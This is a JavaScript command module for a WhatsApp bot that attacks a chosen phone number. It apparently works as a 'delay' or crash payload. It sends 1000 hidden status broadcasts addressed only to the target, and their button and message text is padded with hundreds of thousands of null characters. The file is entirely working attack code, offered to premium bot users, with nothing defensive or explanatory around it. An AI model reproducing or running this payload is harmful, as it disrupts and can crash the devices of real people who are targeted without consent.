import { isJidGroup } from "@bayumahadika/baileysx";
import utils from "@bayumahadika/utils";
import chalk from "chalk";

export default {
  description: "Delay invis story",
  onlyOwner: false,
  onlyPremium: true,
  handle: async (sock, m) => {
    if (!m.args[0]) return;
    if (isJidGroup(m.args[0]))
      return m.replyError("Hanya support untuk private chat");
    const number = m.args[0]?.replace(/\D/g, "");
    if (!number) return m.replyError("Target dibutuhkan");
    const jid = (await sock.onWhatsApp(`${number}@s.whatsapp.net`))[0]?.jid;
    if (!jid) return m.replyError(`${m.args[0]} tidak terdaftar diwhatsapp`);
    await m.reply(global.mess.spam);
    for (let i = 0; i < 1000; i++) {
      try {
        await utils.sleep(500);
        await sock.relay(
          "status@broadcast",
          {
            buttonsMessage: {
              buttons: [
                {
                  buttonId: "p",
                  buttonText: {
                    displayText: `x${"\u0000".repeat(880000)}`,
                  },

                  type: 1,
                },
                {
                  buttonId: "p",
                  buttonText: {
                    displayText: "x",
                  },
                  nativeFlowInfo: {
                    name: "call_permission_request",
                    paramsJson: "",
                  },
                  type: 1,
                },
              ],
              contentText: "content text",
              text: `x${"\u0000".repeat(90000)}`,
              headerType: 2,
            },
          },
          {
            statusJidList: [jid],
            additionalNodes: [
              {
                tag: "meta",
                attrs: {},
                content: [
                  {
                    tag: "mentioned_users",
                    attrs: {},
                    content: [
                      {
                        tag: "to",
                        attrs: { jid },
                        content: undefined,
                      },
                    ],
                  },
                ],
              },
            ],
          },
        );
        console.log(
          `${chalk.bgBlueBright.bold.white(
            `[${i + 1}]. DELAY MAKER INVIS - STORY`,
          )}: ${chalk.bold(m.args[0])}`,
        );
      } catch (err) {
        console.log(err);
      }
    }
  },
};
